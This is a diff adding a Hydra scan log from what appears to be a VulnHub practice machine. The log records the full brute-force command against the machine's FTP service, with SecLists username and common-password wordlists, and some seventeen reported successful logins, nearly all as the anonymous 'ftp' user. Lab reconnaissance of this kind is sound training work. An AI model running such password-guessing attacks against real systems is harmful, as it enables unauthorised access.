@@ -1,0 +1,17 @@
+# Hydra v8.6 run at 2019-09-10 11:08:38 on 192.168.92.169 ftp (hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr -s 21 -o /root/toolbox/vulnhub/bsidesvancouver2018workshop/results/192.168.92.169/scans/tcp_21_ftp_hydra.txt ftp://192.168.92.169)
+[21][ftp] host: 192.168.92.169   login: ftp   password: ftp
+[21][ftp] host: 192.168.92.169   login: ftp
+[21][ftp] host: 192.168.92.169   login: ftp   password: ptf
+[21][ftp] host: 192.168.92.169   login: ftp   password: 123456
+[21][ftp] host: 192.168.92.169   login: ftp   password: 123456789
+[21][ftp] host: 192.168.92.169   login: ftp   password: 111111
+[21][ftp] host: 192.168.92.169   login: ftp   password: password
+[21][ftp] host: 192.168.92.169   login: ftp   password: qwerty
+[21][ftp] host: 192.168.92.169   login: ftp   password: abc123
+[21][ftp] host: 192.168.92.169   login: ftp   password: password1
+[21][ftp] host: 192.168.92.169   login: ftp   password: 12345
+[21][ftp] host: 192.168.92.169   login: ftp   password: 1234567
+[21][ftp] host: 192.168.92.169   login: ftp   password: 123123
+[21][ftp] host: 192.168.92.169   login: ftp   password: 1234567890
+[21][ftp] host: 192.168.92.169   login: ftp   password: 12345678
+[21][ftp] host: 192.168.92.169   login: ftp   password: 000000
